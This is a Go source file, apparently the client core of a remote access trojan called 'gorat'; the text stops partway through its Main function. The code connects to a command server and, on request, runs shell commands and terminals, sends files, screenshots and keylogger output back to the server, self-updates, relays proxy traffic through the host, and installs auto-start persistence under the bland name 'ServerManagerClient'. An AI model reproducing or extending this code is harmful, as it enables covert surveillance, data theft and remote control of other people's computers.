package client

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"

	"gorat/common"

	"github.com/gorilla/websocket"
)

const (
	ClientVersion = "1.0.0"

	// Connection pool settings
	MaxPooledConns   = 10               // Maximum connections per remote host
	PoolConnIdleTime = 5 * time.Minute  // Idle timeout
	PoolConnLifetime = 30 * time.Minute // Max connection lifetime
)

// PooledConnection represents a pooled connection
type PooledConnection struct {
	conn       net.Conn
	lastUsed   time.Time
	created    time.Time
	inUse      bool
	usageCount int
}

// ConnectionPool manages connections to a specific remote address
type ConnectionPool struct {
	addr        string
	connections []*PooledConnection
	mu          sync.Mutex
	maxConns    int
	idleTimeout time.Duration
	maxLifetime time.Duration
}

// PoolManager manages all connection pools
type PoolManager struct {
	pools map[string]*ConnectionPool
	mu    sync.RWMutex
}

// NewPoolManager creates a new pool manager
func NewPoolManager() *PoolManager {
	return &PoolManager{
		pools: make(map[string]*ConnectionPool),
	}
}

// GetPool returns or creates a connection pool for an address
func (pm *PoolManager) GetPool(addr string) *ConnectionPool {
	pm.mu.RLock()
	pool, exists := pm.pools[addr]
	pm.mu.RUnlock()

	if exists {
		return pool
	}

	pm.mu.Lock()
	defer pm.mu.Unlock()

	// Double-check after acquiring write lock
	if pool, exists = pm.pools[addr]; exists {
		return pool
	}

	pool = &ConnectionPool{
		addr:        addr,
		connections: make([]*PooledConnection, 0, MaxPooledConns),
		maxConns:    MaxPooledConns,
		idleTimeout: PoolConnIdleTime,
		maxLifetime: PoolConnLifetime,
	}
	pm.pools[addr] = pool
	return pool
}

// Get retrieves or creates a connection from the pool
func (cp *ConnectionPool) Get() (net.Conn, error) {
	cp.mu.Lock()
	defer cp.mu.Unlock()

	now := time.Now()

	// Try to find an available connection
	for _, pc := range cp.connections {
		if pc.inUse {
			continue
		}

		// Check if connection is expired
		if now.Sub(pc.created) > cp.maxLifetime || now.Sub(pc.lastUsed) > cp.idleTimeout {
			pc.conn.Close()
			continue
		}

		// Mark as in-use and return
		pc.inUse = true
		pc.lastUsed = now
		pc.usageCount++
		return pc.conn, nil
	}

	// No available connection, create new if under limit
	if len(cp.connections) < cp.maxConns {
		conn, err := net.Dial("tcp", cp.addr)
		if err != nil {
			return nil, err
		}

		pc := &PooledConnection{
			conn:       conn,
			lastUsed:   now,
			created:    now,
			inUse:      true,
			usageCount: 1,
		}
		cp.connections = append(cp.connections, pc)
		return conn, nil
	}

	// Pool is full, create a temporary connection
	return net.Dial("tcp", cp.addr)
}

// Put returns a connection to the pool
func (cp *ConnectionPool) Put(conn net.Conn) {
	cp.mu.Lock()
	defer cp.mu.Unlock()

	for _, pc := range cp.connections {
		if pc.conn == conn {
			pc.inUse = false
			pc.lastUsed = time.Now()
			return
		}
	}

	// Connection not from pool, close it
	conn.Close()
}

// CleanIdle removes idle and expired connections
func (cp *ConnectionPool) CleanIdle() {
	cp.mu.Lock()
	defer cp.mu.Unlock()

	now := time.Now()
	active := make([]*PooledConnection, 0, len(cp.connections))

	for _, pc := range cp.connections {
		// Keep in-use connections
		if pc.inUse {
			active = append(active, pc)
			continue
		}

		// Remove expired or idle connections
		if now.Sub(pc.created) > cp.maxLifetime || now.Sub(pc.lastUsed) > cp.idleTimeout {
			pc.conn.Close()
			continue
		}

		active = append(active, pc)
	}

	cp.connections = active
}

// Close closes all connections in the pool
func (cp *ConnectionPool) Close() {
	cp.mu.Lock()
	defer cp.mu.Unlock()

	for _, pc := range cp.connections {
		pc.conn.Close()
	}
	cp.connections = nil
}

// Stats returns pool statistics
func (cp *ConnectionPool) Stats() map[string]interface{} {
	cp.mu.Lock()
	defer cp.mu.Unlock()

	totalConns := len(cp.connections)
	inUseConns := 0
	idleConns := 0
	totalUsage := 0

	for _, pc := range cp.connections {
		if pc.inUse {
			inUseConns++
		} else {
			idleConns++
		}
		totalUsage += pc.usageCount
	}

	return map[string]interface{}{
		"total_connections": totalConns,
		"in_use":            inUseConns,
		"idle":              idleConns,
		"total_usage":       totalUsage,
		"address":           cp.addr,
	}
}

// CleanAll cleans idle connections in all pools
func (pm *PoolManager) CleanAll() {
	pm.mu.RLock()
	pools := make([]*ConnectionPool, 0, len(pm.pools))
	for _, pool := range pm.pools {
		pools = append(pools, pool)
	}
	pm.mu.RUnlock()

	for _, pool := range pools {
		pool.CleanIdle()
	}
}

// CloseAll closes all connection pools
func (pm *PoolManager) CloseAll() {
	pm.mu.Lock()
	defer pm.mu.Unlock()

	for _, pool := range pm.pools {
		pool.Close()
	}
	pm.pools = make(map[string]*ConnectionPool)
}

// GetAllStats returns statistics for all pools
func (pm *PoolManager) GetAllStats() []map[string]interface{} {
	pm.mu.RLock()
	defer pm.mu.RUnlock()

	stats := make([]map[string]interface{}, 0, len(pm.pools))
	for _, pool := range pm.pools {
		stats = append(stats, pool.Stats())
	}
	return stats
}

// Client represents the client application
type Client struct {
	config        *Config
	conn          *websocket.Conn
	authenticated bool
	running       bool
	instanceMgr   *InstanceManager

	// Component handlers
	commandExec *CommandExecutor
	fileBrowser *FileBrowser
	screenshot  *ScreenshotCapture
	keylogger   *Keylogger
	updater     *Updater
	autoStart   *AutoStart
	terminalMgr *TerminalManager

	// Channels
	sendChan chan *common.Message
	stopChan chan bool

	// Proxy connections: map[proxyID-userID]net.Conn
	proxyConns map[string]net.Conn
	proxyMu    sync.RWMutex

	// Track remote addresses for pool return: map[proxyID-userID]remoteAddr
	proxyAddrs map[string]string

	// Connection pool manager
	poolMgr *PoolManager
}

// Config holds client configuration
type Config struct {
	ServerURL string
	ClientID  string
	AuthToken string
	AutoStart bool
}

// NewClient creates a new client instance
func NewClient(config *Config, instanceMgr *InstanceManager) *Client {
	if ShouldLog() {
		log.Printf("[DEBUG] NewClient: Starting client creation")
		log.Printf("[DEBUG] NewClient: Creating terminal manager")
	}
	terminalMgr := NewTerminalManager()

	if ShouldLog() {
		log.Printf("[DEBUG] NewClient: Creating command executor")
	}
	cmdExec := NewCommandExecutor()
	if ShouldLog() {
		log.Printf("[DEBUG] NewClient: Creating file browser")
	}
	fileBrowser := NewFileBrowser()
	if ShouldLog() {
		log.Printf("[DEBUG] NewClient: Creating screenshot capture")
	}
	screenshot := NewScreenshotCapture()
	if ShouldLog() {
		log.Printf("[DEBUG] NewClient: Creating keylogger")
	}
	keylogger := NewKeylogger()
	if ShouldLog() {
		log.Printf("[DEBUG] NewClient: Creating updater")
	}
	updater := NewUpdater(ClientVersion)
	if ShouldLog() {
		log.Printf("[DEBUG] NewClient: Creating auto-start handler")
	}
	autoStart := NewAutoStart("ServerManagerClient")

	if ShouldLog() {
		log.Printf("[DEBUG] NewClient: Assembling client struct")
	}
	client := &Client{
		config:      config,
		commandExec: cmdExec,
		fileBrowser: fileBrowser,
		screenshot:  screenshot,
		keylogger:   keylogger,
		updater:     updater,
		autoStart:   autoStart,
		terminalMgr: terminalMgr,
		sendChan:    make(chan *common.Message, 256),
		stopChan:    make(chan bool),
		instanceMgr: instanceMgr,
		proxyConns:  make(map[string]net.Conn),
		proxyAddrs:  make(map[string]string),
		poolMgr:     NewPoolManager(),
	}
	if ShouldLog() {
		log.Printf("[DEBUG] NewClient: Client created successfully")
	}

	// Set terminal output callbacks
	terminalMgr.SetOutputCallback(func(sessionID, data string) {
		payload := &common.TerminalOutputPayload{
			SessionID: sessionID,
			Data:      data,
		}
		client.sendMessage(common.MsgTypeTerminalOutput, payload)
	})

	terminalMgr.SetErrorCallback(func(sessionID, data string) {
		payload := &common.TerminalOutputPayload{
			SessionID: sessionID,
			Data:      data,
			Error:     "stderr",
		}
		client.sendMessage(common.MsgTypeTerminalOutput, payload)
	})

	return client
}

// Start starts the client
func (c *Client) Start() error {
	log.Printf("Starting client version %s", ClientVersion)
	log.Printf("Client ID: %s", c.config.ClientID)
	log.Printf("Server URL: %s", c.config.ServerURL)

	// Write PID file (single instance enforcement occurs before this call)
	if err := c.instanceMgr.WritePID(); err != nil {
		log.Printf("Warning: failed to write PID file: %v", err)
	}

	// Setup auto-start if configured
	if c.config.AutoStart {
		if err := c.autoStart.Enable(); err != nil {
			log.Printf("Warning: Failed to enable auto-start: %v", err)
		} else {
			log.Printf("Auto-start enabled")
		}
	}

	c.running = true

	// Start connection loop in background
	go c.connectionLoop()

	// Start pool cleanup goroutine
	go c.poolCleanupLoop()

	log.Printf("Client started successfully")
	return nil
}

// connectionLoop manages connection lifecycle with automatic reconnection
func (c *Client) connectionLoop() {
	reconnectDelay := 1 * time.Second
	maxReconnectDelay := 30 * time.Second

	for c.running {
		// Attempt to connect
		log.Printf("Attempting to connect to server...")
		if err := c.connect(); err != nil {
			log.Printf("Connection failed: %v", err)
			log.Printf("Retrying in %v...", reconnectDelay)
			time.Sleep(reconnectDelay)

			// Exponential backoff for reconnect delay (but less aggressive)
			if reconnectDelay < 10*time.Second {
				reconnectDelay += 500 * time.Millisecond
			} else {
				reconnectDelay = time.Duration(float64(reconnectDelay) * 1.3)
			}
			if reconnectDelay > maxReconnectDelay {
				reconnectDelay = maxReconnectDelay
			}
			continue
		}

		// Connection successful, reset delay
		reconnectDelay = 1 * time.Second
		log.Printf("Connected successfully")

		// Create a session-specific disconnect channel for this connection
		disconnectChan := make(chan bool, 1)

		// Start message pumps
		go c.readPump(disconnectChan)
		go c.writePump(disconnectChan)
		go c.heartbeatLoop(disconnectChan)

		// Wait for disconnection or stop signal
		select {
		case <-disconnectChan:
			log.Printf("Connection lost, will reconnect...")
			if c.conn != nil {
				c.conn.Close()
			}
			// Drain any remaining signals
			select {
			case <-disconnectChan:
			default:
			}
		case <-c.stopChan:
			log.Printf("Stop signal received")
			if c.conn != nil {
				c.conn.Close()
			}
			return
		}
	}
}

// Stop stops the client
func (c *Client) Stop() {
	log.Printf("Stopping client...")
	c.running = false
	close(c.stopChan)

	if c.keylogger.IsRunning() {
		c.keylogger.Stop()
	}

	if c.conn != nil {
		c.conn.Close()
	}

	// Close all connection pools
	if c.poolMgr != nil {
		c.poolMgr.CloseAll()
	}

	c.instanceMgr.RemovePID()
	log.Printf("Client stopped")
}

// poolCleanupLoop periodically cleans idle connections from pools
func (c *Client) poolCleanupLoop() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for c.running {
		select {
		case <-ticker.C:
			c.poolMgr.CleanAll()
		case <-c.stopChan:
			return
		}
	}
}

// connect establishes connection to the server
func (c *Client) connect() error {
	log.Printf("Connecting to server: %s", c.config.ServerURL)

	// Setup TLS config - always verify certificates for HTTPS
	tlsConfig := &tls.Config{
		InsecureSkipVerify: false, // Always verify certificates
		MinVersion:         tls.VersionTLS12,
	}

	dialer := websocket.Dialer{
		TLSClientConfig:  tlsConfig,
		HandshakeTimeout: 15 * time.Second,
	}

	// Connect to WebSocket
	conn, _, err := dialer.Dial(c.config.ServerURL, http.Header{})
	if err != nil {
		// Provide more diagnostic info for common Windows TLS issues
		log.Printf("Connection failed: %v", err)
		if strings.Contains(err.Error(), "x509") {
			log.Printf("TLS verification error detected. If using a self-signed certificate, import the CA into the Windows Trusted Root Certification Authorities store.")
			log.Printf("For development, ensure you started server with valid certs or use nginx with a publicly trusted certificate.")
		}
		if strings.Contains(err.Error(), "handshake") {
			log.Printf("Handshake failed. Verify that the server URL scheme (ws:// vs wss://) matches server configuration (HTTP or TLS).")
		}
		return err
	}

	c.conn = conn
	log.Printf("WebSocket connection established (TLS verified)")

	// Authenticate
	if err := c.authenticate(); err != nil {
		c.conn.Close()
		return err
	}

	log.Printf("Authentication successful")
	return nil
}

// getLocalIP gets the local IP address
func (c *Client) getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return ""
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

// authenticate performs authentication with the server
func (c *Client) authenticate() error {
	hostname, _ := os.Hostname()
	localIP := c.getLocalIP()

	authPayload := &common.AuthPayload{
		ClientID: c.config.ClientID,
		Token:    c.config.ClientID, // Use machine ID as token
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Hostname: hostname,
		IP:       localIP,
	}

	authMsg, err := common.NewMessage(common.MsgTypeAuth, authPayload)
	if err != nil {
		return err
	}

	// Send authentication message
	if err := c.conn.WriteJSON(authMsg); err != nil {
		return err
	}

	// Wait for response
	var respMsg common.Message
	if err := c.conn.ReadJSON(&respMsg); err != nil {
		return err
	}

	if respMsg.Type != common.MsgTypeAuthResponse {
		return ErrInvalidResponse
	}

	var authResp common.AuthResponsePayload
	if err := respMsg.ParsePayload(&authResp); err != nil {
		return err
	}

	if !authResp.Success {
		return ErrAuthFailed
	}

	c.authenticated = true
	return nil
}

// readPump reads messages from the server
func (c *Client) readPump(disconnectChan chan bool) {
	defer func() {
		log.Printf("readPump: Connection lost, signaling disconnection")
		// Signal disconnection
		select {
		case disconnectChan <- true:
		default:
		}
	}()

	c.conn.SetReadDeadline(time.Now().Add(90 * time.Second))
	c.conn.SetPongHandler(func(string) error {
		c.conn.SetReadDeadline(time.Now().Add(90 * time.Second))
		return nil
	})

	for c.running {
		// Read as raw JSON to check message type
		var rawMsg map[string]interface{}
		err := c.conn.ReadJSON(&rawMsg)
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("WebSocket error: %v", err)
			}
			break
		}

		// Check if this is a proxy message
		if msgType, ok := rawMsg["type"].(string); ok {
			switch msgType {
			case "proxy_connect":
				// Handle proxy connection request
				c.handleProxyConnect(rawMsg)
				continue
			case "proxy_data":
				// Handle proxy data relay
				c.handleProxyData(rawMsg)
				continue
			case "proxy_disconnect":
				// Handle proxy disconnection
				c.handleProxyDisconnect(rawMsg)
				continue
			}
		}

		// Not a proxy message, parse as common.Message
		jsonData, _ := json.Marshal(rawMsg)
		var msg common.Message
		if err := json.Unmarshal(jsonData, &msg); err != nil {
			log.Printf("Failed to parse message: %v", err)
			continue
		}

		// Handle message
		go c.handleMessage(&msg)
	}
}

// writePump writes messages to the server
func (c *Client) writePump(disconnectChan chan bool) {
	ticker := time.NewTicker(30 * time.Second)
	defer func() {
		ticker.Stop()
		if c.conn != nil {
			c.conn.Close()
		}
		log.Printf("writePump: Connection lost, signaling disconnection")
		// Signal disconnection
		select {
		case disconnectChan <- true:
		default:
		}
	}()

	for {
		select {
		case message, ok := <-c.sendChan:
			if c.conn == nil {
				return
			}
			c.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if !ok {
				c.conn.WriteMessage(websocket.CloseMessage, []byte{})
				return
			}

			if err := c.conn.WriteJSON(message); err != nil {
				log.Printf("Write error: %v", err)
				return
			}

		case <-ticker.C:
			if c.conn == nil {
				return
			}
			c.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if err := c.conn.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}

		case <-c.stopChan:
			return
		}
	}
}

// handleMessage handles incoming messages from the server
func (c *Client) handleMessage(msg *common.Message) {
	log.Printf("Received message: %s", msg.Type)

	switch msg.Type {
	case common.MsgTypeExecuteCommand:
		c.handleExecuteCommand(msg)

	case common.MsgTypeBrowseFiles:
		c.handleBrowseFiles(msg)

	case common.MsgTypeGetDrives:
		c.handleGetDrives(msg)

	case common.MsgTypeDownloadFile:
		c.handleDownloadFile(msg)

	case common.MsgTypeUploadFile:
		c.handleUploadFile(msg)

	case common.MsgTypeTakeScreenshot:
		c.handleTakeScreenshot(msg)

	case common.MsgTypeStartKeylogger:
		c.handleStartKeylogger(msg)

	case common.MsgTypeStopKeylogger:
		c.handleStopKeylogger(msg)

	case common.MsgTypeUpdate:
		c.handleUpdate(msg)

	case common.MsgTypeStartTerminal:
		c.handleStartTerminal(msg)

	case common.MsgTypeTerminalInput:
		c.handleTerminalInput(msg)

	case common.MsgTypeStopTerminal:
		c.handleStopTerminal(msg)

	case common.MsgTypeListProcesses:
		c.handleListProcesses(msg)

	case common.MsgTypeGetSystemInfo:
		c.handleGetSystemInfo(msg)

	case common.MsgTypePing:
		c.sendMessage(common.MsgTypePong, nil)

	default:
		log.Printf("Unknown message type: %s", msg.Type)
	}
}

// shouldPoolConnection checks if protocol should use connection pooling
func shouldPoolConnection(protocol string) bool {
	// Only pool stateless/idempotent protocols
	// Don't pool interactive protocols like SSH, Telnet, RDP, etc.
	poolable := map[string]bool{
		"http":  true,
		"https": true,
	}
	return poolable[strings.ToLower(protocol)]
}

// handleProxyConnect handles proxy connection requests from the server
func (c *Client) handleProxyConnect(rawMsg map[string]interface{}) {
	proxyID, _ := rawMsg["proxy_id"].(string)
	userID, _ := rawMsg["user_id"].(string)
	remoteHost, _ := rawMsg["remote_host"].(string)
	remotePort, _ := rawMsg["remote_port"].(float64)
	protocol, _ := rawMsg["protocol"].(string)

	log.Printf("Proxy connect request: proxy=%s, user=%s, remote=%s:%d, protocol=%s",
		proxyID, userID, remoteHost, int(remotePort), protocol)

	remoteAddr := fmt.Sprintf("%s:%d", remoteHost, int(remotePort))
	usePooling := shouldPoolConnection(protocol)

	var remoteConn net.Conn
	var err error

	if usePooling {
		// Get connection from pool for stateless protocols
		pool := c.poolMgr.GetPool(remoteAddr)
		remoteConn, err = pool.Get()
		if err != nil {
			log.Printf("Failed to get pooled connection to remote host %s: %v", remoteAddr, err)
			c.sendProxyMessage("proxy_disconnect", proxyID, userID, nil)
			return
		}
		log.Printf("Connected to remote host: %s (from pool)", remoteAddr)
	} else {
		// Create new connection for interactive protocols
		remoteConn, err = net.Dial("tcp", remoteAddr)
		if err != nil {
			log.Printf("Failed to connect to remote host %s: %v", remoteAddr, err)
			c.sendProxyMessage("proxy_disconnect", proxyID, userID, nil)
			return
		}
		log.Printf("Connected to remote host: %s (new connection)", remoteAddr)
	}

	// Store the connection
	connKey := fmt.Sprintf("%s-%s", proxyID, userID)
	c.proxyMu.Lock()
	c.proxyConns[connKey] = remoteConn
	if usePooling {
		c.proxyAddrs[connKey] = remoteAddr
	}
	c.proxyMu.Unlock()

	log.Printf("Stored proxy connection: key=%s (pooled=%v)", connKey, usePooling)

	// Start relaying data from remote to server
	go c.relayProxyData(proxyID, userID, remoteConn, remoteAddr, usePooling)
}

// handleProxyData handles proxy data from the server
func (c *Client) handleProxyData(rawMsg map[string]interface{}) {
	proxyID, _ := rawMsg["proxy_id"].(string)
	userID, _ := rawMsg["user_id"].(string)

	var data []byte
	if dataVal, ok := rawMsg["data"]; ok {
		if dataStr, ok := dataVal.(string); ok {
			// Decode base64
			var err error
			data, err = base64.StdEncoding.DecodeString(dataStr)
			if err != nil {
				log.Printf("Error decoding base64 proxy data: proxy=%s, user=%s: %v", proxyID, userID, err)
				return
			}
		}
	}

	// Get the remote connection and send data to it
	connKey := fmt.Sprintf("%s-%s", proxyID, userID)
	c.proxyMu.RLock()
	remoteConn, ok := c.proxyConns[connKey]
	c.proxyMu.RUnlock()

	if !ok {
		log.Printf("Proxy connection not found: key=%s", connKey)
		return
	}

	if len(data) > 0 {
		_, err := remoteConn.Write(data)
		if err != nil {
			log.Printf("Error writing to remote connection: proxy=%s, user=%s: %v", proxyID, userID, err)

			// Get remote address and return connection to pool
			c.proxyMu.Lock()
			remoteAddr, hasAddr := c.proxyAddrs[connKey]
			delete(c.proxyConns, connKey)
			delete(c.proxyAddrs, connKey)
			c.proxyMu.Unlock()

			if hasAddr {
				pool := c.poolMgr.GetPool(remoteAddr)
				pool.Put(remoteConn)
			} else {
				remoteConn.Close()
			}

			// Notify server
			c.sendProxyMessage("proxy_disconnect", proxyID, userID, nil)
			return
		}
	}
}

// handleProxyDisconnect handles proxy disconnection from the server
func (c *Client) handleProxyDisconnect(rawMsg map[string]interface{}) {
	proxyID, _ := rawMsg["proxy_id"].(string)
	userID, _ := rawMsg["user_id"].(string)

	log.Printf("Proxy disconnect: proxy=%s, user=%s", proxyID, userID)

	// Return remote connection to pool if it exists
	connKey := fmt.Sprintf("%s-%s", proxyID, userID)
	c.proxyMu.Lock()
	remoteConn, hasConn := c.proxyConns[connKey]
	remoteAddr, hasAddr := c.proxyAddrs[connKey]
	delete(c.proxyConns, connKey)
	delete(c.proxyAddrs, connKey)
	c.proxyMu.Unlock()

	if hasConn {
		if hasAddr {
			// Connection from pool - return it
			pool := c.poolMgr.GetPool(remoteAddr)
			pool.Put(remoteConn)
			log.Printf("Returned connection to pool: key=%s, addr=%s", connKey, remoteAddr)
		} else {
			// Interactive protocol - close immediately
			remoteConn.Close()
			log.Printf("Closed proxy connection: key=%s", connKey)
		}
	}
}

// sendProxyMessage sends a proxy message to the server
func (c *Client) sendProxyMessage(msgType, proxyID, userID string, data []byte) {
	msg := map[string]interface{}{
		"type":     msgType,
		"proxy_id": proxyID,
		"user_id":  userID,
	}

	if data != nil && len(data) > 0 {
		msg["data"] = base64.StdEncoding.EncodeToString(data)
	}

	c.conn.WriteJSON(msg)
}

// relayProxyData relays data from remote host back to the server
func (c *Client) relayProxyData(proxyID, userID string, remoteConn net.Conn, remoteAddr string, usePooling bool) {
	connKey := fmt.Sprintf("%s-%s", proxyID, userID)

	defer func() {
		c.proxyMu.Lock()
		delete(c.proxyConns, connKey)
		delete(c.proxyAddrs, connKey)
		c.proxyMu.Unlock()

		if usePooling {
			// Return connection to pool for reuse
			pool := c.poolMgr.GetPool(remoteAddr)
			pool.Put(remoteConn)
			log.Printf("Returned connection to pool: %s", remoteAddr)
		} else {
			// Close connection for interactive protocols
			remoteConn.Close()
			log.Printf("Closed connection: %s", remoteAddr)
		}
	}()

	buf := make([]byte, 16384) // Increased buffer size
	for {
		remoteConn.SetReadDeadline(time.Now().Add(30 * time.Second))
		n, err := remoteConn.Read(buf)
		if err != nil {
			if err != io.EOF {
				log.Printf("Remote connection error: proxy=%s, user=%s: %v", proxyID, userID, err)
			}
			// Notify server of disconnect
			c.sendProxyMessage("proxy_disconnect", proxyID, userID, nil)
			break
		}

		if n > 0 {
			// Send data to server via proxy_data message
			c.sendProxyMessage("proxy_data", proxyID, userID, buf[:n])
		}
	}
}

// handleExecuteCommand handles command execution requests
func (c *Client) handleExecuteCommand(msg *common.Message) {
	var payload common.ExecuteCommandPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse command payload: %v", err)
		return
	}

	log.Printf("Executing command: %s %v", payload.Command, payload.Args)
	result := c.commandExec.Execute(&payload)

	c.sendMessage(common.MsgTypeCommandResult, result)
}

// handleBrowseFiles handles file browsing requests
func (c *Client) handleBrowseFiles(msg *common.Message) {
	var payload common.BrowseFilesPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse browse payload: %v", err)
		return
	}

	log.Printf("Browsing files: %s", payload.Path)
	result := c.fileBrowser.Browse(&payload)

	c.sendMessage(common.MsgTypeFileList, result)
}

// handleGetDrives handles drive listing requests (Windows)
func (c *Client) handleGetDrives(msg *common.Message) {
	log.Printf("Getting drive list")
	result := c.fileBrowser.GetDrives()

	c.sendMessage(common.MsgTypeDriveList, result)
}

// handleDownloadFile handles file download requests
func (c *Client) handleDownloadFile(msg *common.Message) {
	var payload struct {
		Path string `json:"path"`
	}
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse download payload: %v", err)
		return
	}

	log.Printf("Downloading file: %s", payload.Path)
	result := c.fileBrowser.ReadFile(payload.Path)

	c.sendMessage(common.MsgTypeFileData, result)
}

// handleUploadFile handles file upload requests
func (c *Client) handleUploadFile(msg *common.Message) {
	var payload common.FileDataPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse upload payload: %v", err)
		return
	}

	log.Printf("Uploading file: %s", payload.Path)
	err := c.fileBrowser.WriteFile(&payload)

	response := map[string]interface{}{
		"success": err == nil,
		"path":    payload.Path,
	}
	if err != nil {
		response["error"] = err.Error()
	}

	c.sendMessage(common.MsgTypeFileData, response)
}

// handleTakeScreenshot handles screenshot requests
func (c *Client) handleTakeScreenshot(msg *common.Message) {
	var payload common.ScreenshotPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse screenshot payload: %v", err)
		// Use default payload
	}

	log.Printf("Taking screenshot")
	result := c.screenshot.Capture(&payload)

	c.sendMessage(common.MsgTypeScreenshotData, result)
}

// handleStartKeylogger handles keylogger start requests
func (c *Client) handleStartKeylogger(msg *common.Message) {
	var payload common.KeyloggerPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse keylogger payload: %v", err)
		return
	}

	log.Printf("Starting keylogger: target=%s", payload.Target)
	err := c.keylogger.Start(&payload)

	status := &common.UpdateStatusPayload{
		Status: "started",
	}
	if err != nil {
		status.Status = "failed"
		status.Error = err.Error()
	}

	c.sendMessage(common.MsgTypeUpdateStatus, status)
}

// handleStopKeylogger handles keylogger stop requests
func (c *Client) handleStopKeylogger(msg *common.Message) {
	log.Printf("Stopping keylogger")
	err := c.keylogger.Stop()

	status := &common.UpdateStatusPayload{
		Status: "stopped",
	}
	if err != nil {
		status.Status = "failed"
		status.Error = err.Error()
	}

	c.sendMessage(common.MsgTypeUpdateStatus, status)
}

// handleUpdate handles update requests
func (c *Client) handleUpdate(msg *common.Message) {
	var payload common.UpdatePayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse update payload: %v", err)
		return
	}

	log.Printf("Updating to version %s", payload.Version)
	result := c.updater.Update(&payload)

	c.sendMessage(common.MsgTypeUpdateStatus, result)

	// If update successful, restart
	if result.Status == "complete" {
		time.Sleep(2 * time.Second)
		c.updater.RestartClient()
	}
}

// handleStartTerminal handles terminal start requests
func (c *Client) handleStartTerminal(msg *common.Message) {
	var payload common.StartTerminalPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse start terminal payload: %v", err)
		return
	}

	log.Printf("Starting terminal session: %s", payload.SessionID)
	err := HandleStartTerminal(c.terminalMgr, &payload)

	if err != nil {
		errorPayload := &common.TerminalOutputPayload{
			SessionID: payload.SessionID,
			Data:      "",
			Error:     err.Error(),
		}
		c.sendMessage(common.MsgTypeTerminalOutput, errorPayload)
	}
}

// handleTerminalInput handles terminal input
func (c *Client) handleTerminalInput(msg *common.Message) {
	var payload common.TerminalInputPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse terminal input payload: %v", err)
		return
	}

	err := HandleTerminalInput(c.terminalMgr, &payload)
	if err != nil {
		log.Printf("Terminal input error: %v", err)
	}
}

// handleStopTerminal handles terminal stop requests
func (c *Client) handleStopTerminal(msg *common.Message) {
	var payload common.TerminalInputPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse stop terminal payload: %v", err)
		return
	}

	log.Printf("Stopping terminal session: %s", payload.SessionID)
	err := HandleStopTerminal(c.terminalMgr, payload.SessionID)
	if err != nil {
		log.Printf("Failed to stop terminal: %v", err)
	}
}

// handleListProcesses handles process list requests
func (c *Client) handleListProcesses(msg *common.Message) {
	log.Printf("Getting process list")

	processes := getProcessList()
	result := &common.ProcessListPayload{
		Processes: processes,
	}

	c.sendMessage(common.MsgTypeProcessList, result)
}

// handleGetSystemInfo handles system info requests
func (c *Client) handleGetSystemInfo(msg *common.Message) {
	log.Printf("Getting system info")

	info := getSystemInfo()
	c.sendMessage(common.MsgTypeSystemInfo, info)
}

// getProcessList retrieves the list of running processes
func getProcessList() []common.Process {
	var processes []common.Process

	// Implementation varies by OS
	osProcesses := getOSProcessList()
	for _, p := range osProcesses {
		processes = append(processes, common.Process{
			Name:   p.Name,
			PID:    p.PID,
			CPU:    p.CPU,
			Memory: p.Memory,
			Status: "running",
		})
	}

	return processes
}

// OSProcess represents a process with OS-specific data
type OSProcess struct {
	Name   string
	PID    int
	CPU    float64
	Memory float64
}

// getOSProcessList is implemented per-OS
func getOSProcessList() []OSProcess {
	// Platform-specific implementation - will be in system_stats_*.go
	return getOSProcessListImpl()
}

// getSystemInfo retrieves system information
func getSystemInfo() *common.SystemInfoPayload {
	// This will be implemented per-OS in system_stats_*.go files
	return getSystemInfoImpl()
}

// sendMessage sends a message to the server
func (c *Client) sendMessage(msgType common.MessageType, payload interface{}) {
	msg, err := common.NewMessage(msgType, payload)
	if err != nil {
		log.Printf("Failed to create message: %v", err)
		return
	}

	select {
	case c.sendChan <- msg:
	case <-time.After(5 * time.Second):
		log.Printf("Failed to send message: timeout")
	}
}

// heartbeatLoop sends periodic heartbeat messages
func (c *Client) heartbeatLoop(disconnectChan chan bool) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			c.sendHeartbeat()
		case <-disconnectChan:
			return
		case <-c.stopChan:
			return
		}
	}
}

// sendHeartbeat sends a heartbeat message with system stats
func (c *Client) sendHeartbeat() {
	var cpuUsage, memUsage, diskUsage float64

	// Safely get stats with error handling
	if stats := getSafeSystemStats(); stats != nil {
		cpuUsage = stats["cpu"]
		memUsage = stats["mem"]
		diskUsage = stats["disk"]
	}

	payload := &common.HeartbeatPayload{
		ClientID:   c.config.ClientID,
		Status:     "online",
		CPUUsage:   cpuUsage,
		MemUsage:   memUsage,
		DiskUsage:  diskUsage,
		Uptime:     0, // Could track actual uptime
		LastActive: time.Now(),
	}

	c.sendMessage(common.MsgTypeHeartbeat, payload)
}

// Main is the main entry point for the client
func Main() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[PANIC] Recovered from panic: %v", r)
			log.Printf("[PANIC] Waiting 30 seconds before exit to allow log review...")
			time.Sleep(30 * time.Second)
			os.Exit(1)
		}
	}()

	// Build mode will be set by build tags (debug or release)
	if ShouldLog() {
		log.Printf("Client build mode: %s", BuildMode)
